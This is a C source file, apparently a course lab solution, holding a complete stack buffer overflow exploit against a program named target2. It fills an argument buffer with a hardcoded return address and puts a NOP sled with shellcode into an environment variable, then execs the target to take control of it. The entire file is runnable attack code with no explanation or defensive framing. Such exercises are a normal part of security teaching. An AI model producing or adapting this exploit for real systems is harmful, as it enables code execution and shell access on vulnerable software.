// (c) 2015 Reid Pryzant and Tony Liu 
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include "shellcode.h"

#define DEFAULT_BUFFER_SIZE 116
#define NOP                 0x90
#define TGT_ADDRESS         0xbfffff87

//constructs the malicious buffer
char *make_buffer() {
  char *buff;
  long *addr_ptr;
  long addr = TGT_ADDRESS;
  int i;

  buff = (char *)malloc(DEFAULT_BUFFER_SIZE);
  addr_ptr = (long *)buff;

  //addresses are 4 bytes (32 bits)
  for(i = 0; i<DEFAULT_BUFFER_SIZE/4; i++) {
    addr_ptr[i] = addr;
  }
  buff[DEFAULT_BUFFER_SIZE-1] = '\0';

  return buff;
}

char *make_shellcode() {
  int i;
  char *buff = (char *)malloc(DEFAULT_BUFFER_SIZE);

  memcpy(buff, "SHELL=", 6);

  for(i = 6; i< DEFAULT_BUFFER_SIZE; i++) {
    buff[i] = NOP;
  }

  char *tmp = buff + DEFAULT_BUFFER_SIZE - strlen(shellcode) - 1;
  for(i = 0; i < strlen(shellcode); i++) {
    tmp[i] = shellcode[i];
  }
  buff[DEFAULT_BUFFER_SIZE-1] = '\0';

  return buff;
}


int main(int argc, char *argv[])
{
  char *args[3];
  char *env[2];
  char *target = (argc == 2) ? argv[1] : "/usr/local/bin/target2";

  args[0] = target; args[1] = make_buffer(); args[2] = NULL;
  env[0] = make_shellcode();
  env[1] = NULL;
 
  if (0 > execve(target, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
